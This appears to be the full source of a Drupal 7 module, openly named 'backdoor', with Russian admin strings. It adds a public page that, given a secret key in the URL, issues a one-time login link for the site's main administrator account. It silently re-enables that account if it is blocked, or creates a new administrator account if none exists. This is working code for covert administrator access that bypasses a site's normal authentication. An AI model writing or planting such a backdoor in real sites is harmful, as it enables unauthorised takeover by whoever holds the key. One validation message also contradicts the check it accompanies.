<?php

require_once DRUPAL_ROOT . '/' . variable_get('password_inc', 'includes/password.inc');

function backdoor_menu() {
	$items = array();

	$items['backdoor'] = array(
		'title' => 'Backdoor page',
		'description' => 'Here generating one time link for login',
		'page callback' => 'backdoor',
		'access callback' => 'access_backdoor_page',
		'type' => MENU_NORMAL_ITEM,
	);

	$items['admin/config/system/backdoor'] = array(
		'title' => 'Backdoor settings',
		'description' => 'Администрирование модуля Backdoor',
		'page callback' => 'admin_page_backdoor',
		'access arguments' => array('administer site configuration'),
		'type' => MENU_NORMAL_ITEM,
	);

	return $items;
}

function access_backdoor_page() {
	if (isset($_GET['key'])) {
		$account = new stdClass();
		$account->pass = variable_get('key');

		if (user_check_password($_GET['key'], $account)) {
			return TRUE;
		}

	}
}

function backdoor() {
	if ($user = user_load(1)) {

		if ($user->status != 1) {
			$user->status = 1;
			user_save($user);
		}

		$link = l(user_pass_reset_url($user), user_pass_reset_url($user));

	} else {
		$pass = user_password(25);
		$new_password = user_hash_password(trim($pass));
		$newuser = new stdClass();
		$newuser->uid = 1;
		$newuser->name = 'admin';
		$newuser->pass = $new_password;
		$newuser->mail = 'email@example.com';
		$newuser->init = 'email@example.com';
		$newuser->status = 1;
		$newuser->role = array(
			DRUPAL_AUTHENTICATED_RID => TRUE,
			'administrator' => TRUE,
		);

		drupal_write_record('users', $newuser);
		$link = l(user_pass_reset_url($newuser), user_pass_reset_url($newuser));
	}

	return $link;
}

function admin_page_backdoor() {
  $pass_access = drupal_get_form('admin_backdoor_form');
  $pass_access = drupal_render($pass_access);
  return $pass_access;
}

function admin_backdoor_form ($form, &$form_state) {

	$form = array();

	$form['key'] = array(
		'#title' => t('Пароль для входа на защищённую страницу'),
		'#description' => t('Пароль вводится один раз, восстановить его невозможно, так что не потеряйте'),
		'#type' => 'password',
		'#maxlength' => 64,
		'#size' => 35,
		'#required' => TRUE,
	);

	$form['submit'] = array(
		'#type' => 'submit',
		'#value' => t('Отправить'),
	);

	return $form;
}

function admin_backdoor_form_validate ($form, &$form_state){
  $length = mb_strlen($form_state['values']['key']);

  if ($length < 4){
    form_set_error('key', t('Длинна ключа должна быть не более 4-х символов'));
  }

}

function admin_backdoor_form_submit ($form, &$form_state){
  $key = user_hash_password($form_state['values']['key']);
  variable_set('key', $key);
  drupal_set_message(t('Секретный ключ успешно сохранён в базу данных'));
}